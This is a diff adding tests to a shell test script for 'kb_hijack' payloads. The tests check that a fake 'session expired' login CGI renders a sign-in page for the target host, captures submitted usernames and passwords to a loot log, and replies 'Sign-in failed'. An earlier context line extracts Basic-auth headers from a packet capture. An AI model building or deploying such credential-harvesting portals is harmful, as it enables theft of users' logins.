@@ -120,5 +120,24 @@ B64=$(grep -aoiE 'authorization: basic [a-z0-9+/=]{8,120}' "$HR/r/ring.pcap0" | 
 [ "$(echo "$B64" | base64 -d 2>/dev/null)" = "unit:harbor" ] && { echo "PASS  basic decode"; pass=***; } || { echo "FAIL  basic decode"; fail=$((fail+1)); }
 rm -rf "$HR"
 
+echo "== kb_hijack (payload ash-parity + CGI unit; live cycle device-witnessed 2026-09-09) =="
+for d in kb_hijack_start kb_hijack_stop; do
+  busybox ash -n "$PAY/$d/payload.sh" 2>/dev/null && { echo "PASS  ash -n $d"; pass=***; } || { echo "FAIL  ash -n $d"; fail=$((fail+1)); }
+done
+TPLJ="$PAY/kb_hijack_start/template/session_expired/login.cgi"
+busybox ash -n "$TPLJ" 2>/dev/null && { echo "PASS  ash -n login.cgi"; pass=***; } || { echo "FAIL  ash -n login.cgi"; fail=$((fail+1)); }
+HJ=$(mktemp -d)
+export LOOTLOG="$HJ/cap.log"
+env REQUEST_METHOD=GET HTTP_HOST=hijackproof.test REMOTE_ADDR=9.9.9.9 busybox ash "$TPLJ" > "$HJ/get.html" 2>/dev/null
+grep -q "<h1>hijackproof.test</h1>" "$HJ/get.html" && grep -q "tgt=hijackproof.test" "$HJ/cap.log" && { echo "PASS  GET renders target + tgt capture"; pass=***; } || { echo "FAIL  GET target"; fail=$((fail+1)); }
+BODY='username=itguy%40co.com&password=***'
+printf '%s' "$BODY" | env REQUEST_METHOD=POST CONTENT_LENGTH=$(printf '%s' "$BODY" | wc -c) HTTP_HOST=secondtarget.test REMOTE_ADDR=9.9.9.9 busybox ash "$TPLJ" > "$HJ/post.html" 2>/dev/null
+grep -q "Sign-in failed" "$HJ/post.html" && grep -q "user=itguy%40co.com|pass=***" "$HJ/cap.log" && { echo "PASS  POST variants parsed + captured"; pass=***; } || { echo "FAIL  POST variants"; fail=$((fail+1)); }
+BODY2='weirdfield=zzz'
+printf '%s' "$BODY2" | env REQUEST_METHOD=POST CONTENT_LENGTH=$(printf '%s' "$BODY2" | wc -c) HTTP_HOST=t.test REMOTE_ADDR=9.9.9.9 busybox ash "$TPLJ" > /dev/null 2>/dev/null
+grep -q "raw=weirdfield=zzz" "$HJ/cap.log" && { echo "PASS  unknown-field raw fallback"; pass=***; } || { echo "FAIL  raw fallback"; fail=$((fail+1)); }
+rm -rf "$HJ"
+
+
 echo "== result: $pass pass, $fail fail =="
 [ $fail -eq 0 ]
